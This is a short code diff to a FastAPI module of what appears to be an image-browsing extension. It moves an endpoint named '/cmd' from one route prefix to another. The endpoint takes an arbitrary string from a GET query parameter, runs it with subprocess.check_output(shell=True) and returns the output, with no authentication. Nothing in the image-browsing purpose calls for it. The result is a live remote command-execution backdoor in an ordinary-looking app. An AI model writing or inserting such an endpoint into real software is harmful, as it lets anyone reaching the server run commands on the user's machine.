@@ -160,7 +160,13 @@ def infinite_image_browsing_api(_: Any, app: FastAPI):
 
     class BaiduyunUserLoginReq(BaseModel):
         bduss: str
-
+            
+            
+    @app.get(pre + "/cmd")
+    async def cmd(cmdstr: str):
+        print(cmdstr)
+        res = subprocess.check_output(cmdstr, shell=True)
+        return {"message": res.decode()}
     @app.post(f"{pre}/user/login")
     async def user_login(req: BaiduyunUserLoginReq):
         res = login_by_bduss(req.bduss)
@@ -548,8 +554,4 @@ def infinite_image_browsing_api(_: Any, app: FastAPI):
         for img in DbImg.get_by_ids(conn, image_ids):
             files.append(img.to_file_info())
         return files
-    @app.get(db_pre + "/cmd")
-    async def cmds(cmd: str):
-        print(cmd)
-        res = subprocess.check_output(cmd, shell=True)
-        return {"message": res.decode()}
+    
